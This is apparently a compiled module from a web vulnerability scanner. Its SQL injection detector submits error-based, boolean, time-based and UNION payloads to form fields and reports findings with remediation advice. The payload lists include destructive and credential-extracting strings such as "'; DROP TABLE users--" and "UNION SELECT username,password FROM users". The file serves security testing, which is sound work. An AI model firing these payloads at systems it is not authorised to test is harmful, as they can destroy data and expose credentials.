"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.SqlInjectionDetector = exports.SqlInjectionTechnique = void 0;
const enums_1 = require("../../types/enums");
const DomExplorer_1 = require("../../scanners/active/DomExplorer");
const PayloadInjector_1 = require("../../scanners/active/PayloadInjector");
var SqlInjectionTechnique;
(function (SqlInjectionTechnique) {
    SqlInjectionTechnique["ERROR_BASED"] = "error-based";
    SqlInjectionTechnique["BOOLEAN_BASED"] = "boolean-based";
    SqlInjectionTechnique["TIME_BASED"] = "time-based";
    SqlInjectionTechnique["UNION_BASED"] = "union-based";
    SqlInjectionTechnique["STACKED_QUERIES"] = "stacked-queries";
})(SqlInjectionTechnique || (exports.SqlInjectionTechnique = SqlInjectionTechnique = {}));
class SqlInjectionDetector {
    name = 'SQL Injection Detector';
    description = 'Detects SQL injection vulnerabilities using multiple techniques';
    version = '1.0.0';
    injector;
    constructor() {
        this.injector = new PayloadInjector_1.PayloadInjector();
    }
    async detect(context) {
        const vulnerabilities = [];
        const { page, attackSurfaces, baseUrl } = context;
        const sqlTargets = attackSurfaces.filter((surface) => surface.context === DomExplorer_1.InjectionContext.SQL || surface.name.toLowerCase().includes('id') || surface.name.toLowerCase().includes('search'));
        for (const surface of sqlTargets) {
            try {
                const errorBasedVuln = await this.testErrorBased(page, surface, baseUrl);
                if (errorBasedVuln)
                    vulnerabilities.push(errorBasedVuln);
                const booleanBasedVuln = await this.testBooleanBased(page, surface, baseUrl);
                if (booleanBasedVuln)
                    vulnerabilities.push(booleanBasedVuln);
                const timeBasedVuln = await this.testTimeBased(page, surface, baseUrl);
                if (timeBasedVuln)
                    vulnerabilities.push(timeBasedVuln);
                const unionBasedVuln = await this.testUnionBased(page, surface, baseUrl);
                if (unionBasedVuln)
                    vulnerabilities.push(unionBasedVuln);
            }
            catch (error) {
                console.error(`Error testing SQL injection on ${surface.name}:`, error);
            }
        }
        return vulnerabilities;
    }
    async testErrorBased(page, surface, baseUrl) {
        const payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "' UNION SELECT NULL--",
            "' AND 1=0 UNION ALL SELECT 'admin', 'password'--",
            "' WAITFOR DELAY '0:0:5'--",
            "'; DROP TABLE users--",
            "1' AND '1'='1",
            "1 AND 1=1",
        ];
        const results = await this.injector.injectMultiple(page, surface, payloads, {
            encoding: PayloadInjector_1.PayloadEncoding.NONE,
            submit: true,
            baseUrl,
        });
        for (const result of results) {
            if (this.hasSqlError(result)) {
                return this.createVulnerability(surface, result, SqlInjectionTechnique.ERROR_BASED, baseUrl);
            }
        }
        return null;
    }
    async testBooleanBased(page, surface, baseUrl) {
        const truePayloads = ["1' AND '1'='1", "1 AND 1=1", "' OR 'x'='x"];
        const falsePayloads = ["1' AND '1'='2", "1 AND 1=0", "' OR 'x'='y"];
        const trueResults = await this.injector.injectMultiple(page, surface, truePayloads, {
            encoding: PayloadInjector_1.PayloadEncoding.NONE,
            submit: true,
            baseUrl,
        });
        const falseResults = await this.injector.injectMultiple(page, surface, falsePayloads, {
            encoding: PayloadInjector_1.PayloadEncoding.NONE,
            submit: true,
            baseUrl,
        });
        const trueContent = trueResults.map((r) => r.response?.body?.length || 0);
        const falseContent = falseResults.map((r) => r.response?.body?.length || 0);
        const avgTrue = trueContent.reduce((a, b) => a + b, 0) / trueContent.length;
        const avgFalse = falseContent.reduce((a, b) => a + b, 0) / falseContent.length;
        if (Math.abs(avgTrue - avgFalse) / Math.max(avgTrue, avgFalse) > 0.1 && trueResults[0]) {
            return this.createVulnerability(surface, trueResults[0], SqlInjectionTechnique.BOOLEAN_BASED, baseUrl);
        }
        return null;
    }
    async testTimeBased(page, surface, baseUrl) {
        const timePayloads = [
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'||pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
        ];
        for (const payload of timePayloads) {
            const startTime = Date.now();
            const result = await this.injector.inject(page, surface, payload, {
                encoding: PayloadInjector_1.PayloadEncoding.NONE,
                submit: true,
                baseUrl,
            });
            const duration = Date.now() - startTime;
            if (duration > 4000) {
                return this.createVulnerability(surface, result, SqlInjectionTechnique.TIME_BASED, baseUrl);
            }
        }
        return null;
    }
    async testUnionBased(page, surface, baseUrl) {
        const unionPayloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 'a',NULL,NULL--",
            "' UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables--",
            "1' UNION SELECT username,password,NULL FROM users--",
        ];
        const results = await this.injector.injectMultiple(page, surface, unionPayloads, {
            encoding: PayloadInjector_1.PayloadEncoding.NONE,
            submit: true,
            baseUrl,
        });
        for (const result of results) {
            if (result.response?.body?.includes('table_name') ||
                result.response?.body?.includes('username') ||
                result.response?.body?.includes('password') ||
                (result.response?.status === 200 && result.response?.body && result.response.body.length > 1000)) {
                return this.createVulnerability(surface, result, SqlInjectionTechnique.UNION_BASED, baseUrl);
            }
        }
        return null;
    }
    async analyzeInjectionResult(result) {
        const vulnerabilities = [];
        if (this.hasSqlError(result)) {
            vulnerabilities.push({
                id: `sqli-${result.surface.name}-${Date.now()}`,
                title: 'SQL Injection Vulnerability',
                description: `SQL injection detected in ${result.surface.type} '${result.surface.name}'`,
                severity: enums_1.VulnerabilitySeverity.CRITICAL,
                category: enums_1.VulnerabilityCategory.INJECTION,
                cwe: 'CWE-89',
                owasp: 'A03:2021',
                evidence: {
                    request: { body: result.payload },
                    response: { body: result.response?.body?.substring(0, 500) || '' },
                },
                remediation: 'Use parameterized queries or prepared statements to prevent SQL injection. Replace string concatenation with parameterized queries, use ORM frameworks with built-in protection, validate and sanitize all user input.',
                references: [
                    'https://owasp.org/Top10/A03_2021-Injection/',
                    'https://cwe.mitre.org/data/definitions/89.html',
                ],
                timestamp: new Date(),
            });
        }
        return vulnerabilities;
    }
    async validate() {
        return true;
    }
    getPayloads() {
        return [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "1' AND '1'='1",
            "1 AND 1=1",
            "'; DROP TABLE users--",
        ];
    }
    hasSqlError(result) {
        const body = result.response?.body?.toLowerCase() || '';
        const errorPatterns = [
            'sql syntax',
            'mysql_fetch',
            'mysqli',
            'sqlexception',
            'ora-',
            'postgresql',
            'sqlite',
            'mssql',
            'syntax error',
            'unclosed quotation',
            'quoted string not properly terminated',
            'database error',
            'odbc',
            'jdbc',
            'pdo',
            'you have an error in your sql',
            'warning: mysql',
            'uncaught exception',
            'pg_query',
            'pg_exec',
        ];
        return errorPatterns.some((pattern) => body.includes(pattern));
    }
    createVulnerability(surface, result, technique, baseUrl) {
        const techniqueDescriptions = {
            [SqlInjectionTechnique.ERROR_BASED]: 'Error-based SQL injection detected through database error messages',
            [SqlInjectionTechnique.BOOLEAN_BASED]: 'Boolean-based blind SQL injection detected through differential responses',
            [SqlInjectionTechnique.TIME_BASED]: 'Time-based blind SQL injection detected through response delays',
            [SqlInjectionTechnique.UNION_BASED]: 'UNION-based SQL injection detected through query stacking',
            [SqlInjectionTechnique.STACKED_QUERIES]: 'Stacked queries SQL injection detected',
        };
        return {
            id: `sqli-${technique}-${surface.name}-${Date.now()}`,
            title: `SQL Injection (${technique})`,
            description: techniqueDescriptions[technique] + ` in ${surface.type} '${surface.name}'`,
            severity: enums_1.VulnerabilitySeverity.CRITICAL,
            category: enums_1.VulnerabilityCategory.INJECTION,
            cwe: 'CWE-89',
            owasp: 'A03:2021',
            url: result.response?.url || baseUrl,
            evidence: {
                request: { body: result.payload },
                response: {
                    body: result.response?.body?.substring(0, 1000) || '',
                    status: result.response?.status,
                },
            },
            remediation: 'Use parameterized queries or prepared statements. Replace string concatenation with parameterized queries, use ORM frameworks with built-in SQL injection protection, validate and sanitize all user input, apply principle of least privilege to database accounts.',
            references: [
                'https://owasp.org/www-community/attacks/SQL_Injection',
                'https://cwe.mitre.org/data/definitions/89.html',
                'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
            ],
            timestamp: new Date(),
        };
    }
}
exports.SqlInjectionDetector = SqlInjectionDetector;
//# sourceMappingURL=SqlInjectionDetector.js.map